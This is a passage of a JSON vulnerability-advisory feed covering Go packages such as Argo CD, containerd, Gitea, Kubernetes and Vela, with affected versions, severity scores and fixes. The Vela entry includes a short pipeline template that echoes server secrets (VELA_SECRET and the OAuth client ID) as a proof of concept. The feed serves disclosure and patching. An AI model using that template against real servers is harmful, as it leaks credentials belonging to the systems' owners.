"nvd_published_at": "2022-03-07T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8c26-wmh5-6g9v", "modified": "2023-08-30T13:52:18Z", "published": "2022-03-19T00:01:02Z", "aliases": ["CVE-2022-27191"], "summary": "golang.org/x/crypto/ssh Denial of service via crafted Signer", "details": "The golang.org/x/crypto/ssh package before 0.0.0-20220314234659-1baeb1ce4c0b for Go allows an attacker to crash a server in certain circumstances involving AddHostKey.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/crypto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20220314234659-1baeb1ce4c0b"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-27191"}, {"type": "PACKAGE", "url": "https://cs.opensource.google/go/x/crypto"}, {"type": "WEB", "url": "https://go.dev/cl/392355"}, {"type": "WEB", "url": "https://go.googlesource.com/crypto/+/1baeb1ce4c0b006eff0f294c47cb7617598dfb3d"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/-cp44ypCT5s"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DLUJZV3HBP56ADXU6QH2V7RNYUPMVBXQ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/EZ3S7LB65N54HXXBCB67P4TTOHTNPP5O/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HHGBEGJ54DZZGTXFUQNS7ZIG3E624YAF/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/J5WPM42UR6XIBQNQPNQHM32X7S4LJTRX/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QTFOIDHQRGNI4P6LYN6ILH5G443RYYKB/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RQXU752ALW53OJAF5MG3WMR5CCZVLWW6/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YHYRQB7TRMHDB3NEHW5XBRG7PPMUTPGV/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/Z55VUVGO7E5PJFXIOVAY373NZRHBNCI5/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZFUNHFHQVJSADNH7EZ3B53CYDZVEEPBP/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZQNPPQWSTP2IX7SHE6TS4SP4EVMI5EZK/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZY2SLWOQR4ZURQ7UBRZ7JIX6H6F5JHJR/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0356"}, {"type": "WEB", "url": "https://raw.githubusercontent.com/golang/vulndb/df2d3d326300e2ae768f00351ffa96cc2c56cf54/reports/GO-2021-0356.yaml"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220429-0002/"}], "database_specific": {"cwe_ids": ["CWE-327"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-30T18:48:41Z", "nvd_published_at": "2022-03-18T07:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-76j4-gggq-7rg9", "modified": "2022-04-07T15:28:23Z", "published": "2022-03-28T00:00:20Z", "aliases": ["CVE-2022-26245"], "summary": "SQLinjection in falcon-plus", "details": "Falcon-plus v0.3 was discovered to contain a SQL injection vulnerability via the parameter grpName in /config/service/host.go.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/open-falcon/falcon-plus"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.3.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-26245"}, {"type": "WEB", "url": "https://github.com/open-falcon/falcon-plus/issues/951"}, {"type": "PACKAGE", "url": "github.com/open-falcon/falcon-plus"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-04-07T15:28:23Z", "nvd_published_at": "2022-03-27T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r9cr-hvjj-496v", "modified": "2022-03-24T00:04:03Z", "published": "2022-03-24T00:04:03Z", "aliases": ["CVE-2022-24730"], "summary": "Path traversal and improper access control allows leaking out-of-bound files from Argo CD repo-server", "details": "### Impact\n\nAll unpatched versions of Argo CD starting with v1.3.0 are vulnerable to a path traversal bug, compounded by an improper access control bug, allowing a malicious user with read-only repository access to leak sensitive files from Argo CD's repo-server.\n\nA malicious Argo CD user who has been granted [`get` access for a repository](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#rbac-resources-and-actions) containing a Helm chart can craft an API request to the `/api/v1/repositories/{repo_url}/appdetails` endpoint to leak the contents of out-of-bounds files from the repo-server.\n\nThe malicious payload would reference an out-of-bounds file, and the contents of that file would be returned as part of the response. Contents from a non-YAML file may be returned as part of an error message. The attacker would have to know or guess the location of the target file.\n\nSensitive files which could be leaked include files from other Applications' source repositories (potentially decrypted files, if you are using a decryption plugin) or any secrets which have been mounted as files on the repo-server.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.3.0\n* v2.2.6\n* v2.1.11\n\nThe patches do two things:\n 1) prevent path traversal\n 2) limit `/api/v1/repositories/{repo_url}/appdetails` access to users who either A) have been granted Application `create` privileges or B) have been granted Application `get` privileges _and_ are requesting details for a `repo_url` that has already been used for the given Application\n\n### Workarounds\n\nThe only certain way to avoid the vulnerability is to upgrade. \n\nTo mitigate the problem, you can \n* avoid storing secrets in git\n* avoid mounting secrets as files on the repo-server\n* avoid decrypting secrets into files on the repo-server\n* carefully [limit who has `get` access for repositories](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#rbac-resources-and-actions)\n\n### References\n\n* [Security documentation for the repo-server component](https://argo-cd.readthedocs.io/en/stable/operator-manual/security/#git-helm-repositories)\n* [Argo CD RBAC configuration documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#)\n\n### For more information\n\nOpen an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\nJoin us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "2.1.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0-rc1"}, {"fixed": "2.3.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-r9cr-hvjj-496v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24730"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-24T00:04:03Z", "nvd_published_at": "2022-03-23T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-crp2-qrr5-8pq7", "modified": "2022-03-29T19:11:08Z", "published": "2022-03-02T21:33:17Z", "aliases": ["CVE-2022-23648"], "summary": "containerd CRI plugin: Insecure handling of image volumes", "details": "### Impact\n\nA bug was found in containerd where containers launched through containerd\u2019s CRI implementation with a specially-crafted image configuration could gain access to read-only copies of arbitrary files and directories on the host.  This may bypass any policy-based enforcement on container setup (including a Kubernetes Pod Security Policy) and expose potentially sensitive information.  Kubernetes and crictl can both be configured to use containerd\u2019s CRI implementation.\n\n### Patches\n\nThis bug has been fixed in containerd 1.6.1, 1.5.10 and 1.4.13.  Users should update to these versions to resolve the issue.\n\n### Workarounds\n\nEnsure that only trusted images are used.\n\n### Credits\n\nThe containerd project would like to thank Felix Wilhelm of Google Project Zero for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)\n* Email us at [security@containerd.io](mailto:security@containerd.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.6.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-crp2-qrr5-8pq7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23648"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/10f428dac7cec44c864e1b830a4623af27a9fc70"}, {"type": "PACKAGE", "url": "https://github.com/containerd/containerd"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.4.13"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.5.10"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.6.1"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AUDQUQBZJGBWJPMRVB6QCCCRF7O3O4PA/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HFTS2EF3S7HNYSNZSEJZIJHPRU7OPUV3/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OCCARJ6FU4MWBTXHZNMS7NELPDBIX2VO/"}, {"type": "WEB", "url": "https://www.debian.org/security/2022/dsa-5091"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/166421/containerd-Image-Volume-Insecure-Handling.html"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-02T21:33:17Z", "nvd_published_at": "2022-03-03T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jh63-28gx-7p26", "modified": "2022-03-15T19:43:28Z", "published": "2022-03-11T00:02:17Z", "aliases": ["CVE-2022-24193"], "summary": "Command Injection in CasaOS", "details": "CasaOS before v0.2.7 was discovered to contain a command injection vulnerability via the component leave or join zerotier api.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/IceWhaleTech/CasaOS"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.8"}]}], "database_specific": {"last_known_affected_version_range": "< 0.2.7"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24193"}, {"type": "WEB", "url": "https://github.com/IceWhaleTech/CasaOS/issues/84"}, {"type": "WEB", "url": "https://github.com/IceWhaleTech/CasaOS/commit/d060968b7ab08e7f8cbfe7ca9ccdfa47afe9bb06"}, {"type": "PACKAGE", "url": "https://github.com/IceWhaleTech/CasaOS"}, {"type": "WEB", "url": "https://www.star123.top/2022/01/08/A-vulnerability-in-CasaOS/"}, {"type": "WEB", "url": "https://www.star123.top/2022/01/08/A-vulnerability-in-CasaOS/#more"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-03-15T19:43:28Z", "nvd_published_at": "2022-03-10T17:45:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8v99-48m9-c8pm", "modified": "2022-04-13T03:57:32Z", "published": "2022-03-28T19:33:44Z", "aliases": ["CVE-2022-24778"], "summary": "Incorrect Authorization in imgcrypt", "details": "Imgcrypt implements a function `CheckAuthorization()` that is supposed to check whether a user is authorized to access an encrypted image given the keys that the user has provided on the command line that would enable decryption of the image. The check is to prevent that a user can start a container from an image that has previously been decrypted by another user on the same system and therefore a decrypted version of the image layers may be already available in the cache locally.\n\nThe failure occurs when an image with a ManifestList is used and the architecture of the local host is not the first one in the ManifestList. In the version prior to the fix, only the first architecture in the list was tested, which may not have its layers available locally (were not pulled) since it cannot be run on the host architecture. Therefore, the verdict on unavailable layers was that the image could be run anticipating that image run failure would occur later due to the layers not being available. However, this verdict to allow the image to run lead to other architectures in the ManifestList be able to run an image without providing keys if that image had previously been decrypted. The fixed version now skips over irrelevant architectures and tests the Manifest of the local architecture, if available.\n\nKnown projects that use the `CheckAuthorization()` of imgcrypt is for example the ctr-enc client tool provided by imgcrypt. In this implementation, the call to `CheckAuthorization()` is used on the client side and could therefore also be easily circumvented by a modified client tool not calling this function.\n\nIn relation to the vulnerability in ctr-enc, affected environments would have to allow different users to invoke ctr-enc indirectly using some sort of management stack that gives user indirect access to ctr-enc.\n\nThe patch has been applied to imgcrypt v1.1.4. Workarounds may include usage of different namespaces for each remote user.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/imgcrypt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/imgcrypt/security/advisories/GHSA-8v99-48m9-c8pm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24778"}, {"type": "WEB", "url": "https://github.com/containerd/imgcrypt/issues/69"}, {"type": "WEB", "url": "https://github.com/containerd/imgcrypt/commit/6fdd9818a4d8142107b7ecd767d839c9707700d9"}, {"type": "PACKAGE", "url": "https://github.com/containerd/imgcrypt"}, {"type": "WEB", "url": "https://github.com/containerd/imgcrypt/releases/tag/v1.1.4"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4SJUNSC7YZLA745EMKWK2GKEV57GE52K/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TAHAAOOA3KZJC2I5WHCR3XVBJBNWTWUE/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZFTJR5CR5EOYDVOSBZEMLBHLJRTPJPUA/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0412"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-28T19:33:44Z", "nvd_published_at": "2022-03-25T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jpj5-hg26-6jgc", "modified": "2022-03-23T15:47:27Z", "published": "2022-03-13T00:00:54Z", "aliases": ["CVE-2022-26533"], "summary": "Cross-site Scripting in Alist", "details": "Alist versions 2.0.10 through 2.1.0 were discovered to contain a cross-site scripting (XSS) vulnerability via /i/:data/ipa.plist. This issue was fixed in version 2.1.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/Xhofe/alist"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.10"}, {"fixed": "2.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-26533"}, {"type": "WEB", "url": "https://github.com/Xhofe/alist/issues/645"}, {"type": "WEB", "url": "https://github.com/Xhofe/alist/commit/6af17e2509a400979420f613fd7f2f9721fdcd6e"}, {"type": "PACKAGE", "url": "https://github.com/Xhofe/alist"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-23T15:47:27Z", "nvd_published_at": "2022-03-12T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jr9c-h74f-2v28", "modified": "2023-06-30T20:12:44Z", "published": "2022-03-11T00:02:35Z", "aliases": ["CVE-2022-0905"], "summary": "Gitea Missing Authorization vulnerability", "details": "Gitea 1.16.3 and prior is vulnerable to missing authorization. A patch is available as part of the 1.16.4 release.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.16.3"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0905"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/commit/1314f38b59748397b3429fb9bc9f9d6bac85d2f2"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/commit/3e5c844a7758fa29126d201f4f98bf21bca6d314"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}, {"type": "WEB", "url": "https://huntr.dev/bounties/8d221f92-b2b1-4878-bc31-66ff272e5ceb"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-11T20:32:37Z", "nvd_published_at": "2022-03-10T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-chxf-fjcf-7fwp", "modified": "2022-03-01T21:04:07Z", "published": "2022-03-01T21:04:07Z", "aliases": [], "summary": "Possible filesystem space exhaustion by local users", "details": "`fscrypt` through v0.3.2 creates a world-writable directory by default when setting up a filesystem, allowing unprivileged users to exhaust filesystem space. We recommend upgrading to `fscrypt` v0.3.3 or above and adjusting the permissions on existing `fscrypt` metadata directories where applicable.\n\nFor more details, see [CVE-2022-25326](https://www.cve.org/CVERecord?id=CVE-2022-25326) and https://github.com/google/fscrypt#setting-up-fscrypt-on-a-filesystem.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/fscrypt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/fscrypt/security/advisories/GHSA-chxf-fjcf-7fwp"}, {"type": "PACKAGE", "url": "https://github.com/google/fscrypt"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-01T21:04:07Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-mq47-6wwv-v79w", "modified": "2022-03-18T23:23:02Z", "published": "2022-03-04T00:00:16Z", "aliases": ["CVE-2021-3762"], "summary": "Path traversal in claircore", "details": "A directory traversal vulnerability was found in the ClairCore engine of Clair. An attacker can exploit this by supplying a crafted container image which, when scanned by Clair, allows for arbitrary file write on the filesystem, potentially allowing for remote code execution.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/quay/claircore"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/quay/claircore"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/quay/claircore"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.5.0"}, {"fixed": "0.5.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3762"}, {"type": "WEB", "url": "https://github.com/quay/clair/pull/1379"}, {"type": "WEB", "url": "https://github.com/quay/clair/pull/1380"}, {"type": "WEB", "url": "https://github.com/quay/claircore/pull/478"}, {"type": "WEB", "url": "https://github.com/quay/claircore/commit/691f2023a1720a0579e688b69a2f4bfe1f4b7821"}, {"type": "WEB", "url": "https://github.com/quay/claircore/commit/dff671c665141f126c072de8a744855d4916c9c7"}, {"type": "WEB", "url": "https://github.com/quay/claircore/commit/ed5f52aec1c82746725e9cc23e98316eab8be25a"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2000795"}, {"type": "PACKAGE", "url": "https://github.com/quay/claircore"}, {"type": "WEB", "url": "https://github.com/quay/claircore/commits/v0.4.8"}, {"type": "WEB", "url": "https://github.com/quay/claircore/commits/v0.5.5"}, {"type": "WEB", "url": "https://github.com/quay/claircore/commits/v1.1.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0346"}, {"type": "WEB", "url": "https://vulmon.com/exploitdetails?qidtp=maillist_oss_security&qid=d19fce9ede06e13dfb5630ece7f14f83"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-18T23:23:02Z", "nvd_published_at": "2022-03-03T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j9wf-vvm6-4r9w", "modified": "2022-10-31T15:56:21Z", "published": "2022-02-08T21:50:34Z", "aliases": ["CVE-2020-8554"], "summary": "Unverified Ownership in Kubernetes", "details": "Kubernetes API server in all versions allow an attacker who is able to create a ClusterIP service and set the spec.externalIPs field, to intercept traffic to that IP address. Additionally, an attacker who is able to patch the status (which is considered a privileged operation and should not typically be granted to users) of a LoadBalancer service can set the status.loadBalancer.ingress.ip to similar effect.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.22.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8554"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/97076"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/97110"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/iZWsF9nbKE8"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r0c76b3d0be348f788cd947054141de0229af00c540564711e828fd40@%3Ccommits.druid.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r1975078e44d96f2a199aa90aa874b57a202eaf7f25f2fde6d1c44942@%3Ccommits.druid.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rcafa485d63550657f068775801aeb706b7a07140a8ebbdef822b3bb3@%3Ccommits.druid.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rdb223e1b82e3d7d8e4eaddce8dd1ab87252e3935cc41c859f49767b6@%3Ccommits.druid.apache.org%3E"}, {"type": "WEB", "url": "https://www.oracle.com//security-alerts/cpujul2021.html"}, {"type": "WEB", "url": "https://www.oracle.com/security-alerts/cpuapr2022.html"}, {"type": "WEB", "url": "https://www.oracle.com/security-alerts/cpujan2022.html"}], "database_specific": {"cwe_ids": ["CWE-283"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:42:11Z", "nvd_published_at": "2021-01-21T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8h8p-x289-vvqr", "modified": "2022-02-14T21:42:51Z", "published": "2022-02-09T00:00:29Z", "aliases": ["CVE-2021-45325"], "summary": "Gitea displaying raw OpenID error in UI", "details": "Gitea is a project to help users set up a self-hosted Git service. Server Side Request Forgery (SSRF) vulnerability exists in Gitea before 1.7.0 using the OpenID URL. Gitea can leak sensitive information about the local network through the error provided by the UI. ", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-gitea/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-45325"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/issues/4973"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/5705"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/5712"}, {"type": "WEB", "url": "https://blog.gitea.io/2019/01/gitea-1.7.0-is-released/"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-02-14T19:58:31Z", "nvd_published_at": "2022-02-08T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gv2h-gf8m-r68j", "modified": "2022-02-15T00:19:57Z", "published": "2022-02-15T00:19:57Z", "aliases": ["CVE-2020-26294"], "summary": "Exposure of server configuration in github.com/go-vela/server", "details": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\n* The ability to expose configuration set in the [Vela server](https://github.com/go-vela/server) via [pipeline template functionality](https://go-vela.github.io/docs/templates/overview/).\n* It impacts all users of Vela.\n\n\nSample of template exposing server configuration [using Sprig's `env` function](http://masterminds.github.io/sprig/os.html):\n\n```yaml\nmetadata:\n  template: true\n\nsteps:\n  - name: sample\n    image: alpine:latest\n    commands:\n      # OAuth client ID for Vela <-> GitHub communication\n      - echo {{ env \"VELA_SOURCE_CLIENT\" }}\n      # secret used for server <-> worker communication\n      - echo {{ env \"VELA_SECRET\" }}\n```\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\n* Upgrade to `0.6.1`\n\n#### Additional Recommended Action(s)\n\n* Rotate all secrets\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n* No\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Email us at [vela@target.com](mailto:vela@target.com)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-vela/compiler"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/go-vela/compiler/security/advisories/GHSA-gv2h-gf8m-r68j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26294"}, {"type": "WEB", "url": "https://github.com/go-vela/compiler/commit/f1ace5f8a05c95c4d02264556e38a959ee2d9bda"}, {"type": "WEB", "url": "https://github.com/helm/helm/blob/6297c021cbda1483d8c08a8ec6f4a99e38be7302/pkg/engine/funcs.go#L46-L47"}, {"type": "WEB", "url": "https://pkg.go.dev/github.com/go-vela/compiler/compiler"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-78"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-21T17:58:10Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9r5x-fjv3-q6h4", "modified": "2023-10-02T13:24:19Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2021-3127"], "summary": "Incorrect Access Control in github.com/nats-io/jwt and github.com/nats-io/nats-server/v2", "details": "NATS Server (github.com/nats-io/nats-server/v2/server) 2.x before 2.2.0 and JWT library (github.com/nats-io/jwt/v2) before 2.0.1 have Incorrect Access Control because Import Token bindings are mishandled.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/jwt/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/jwt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": 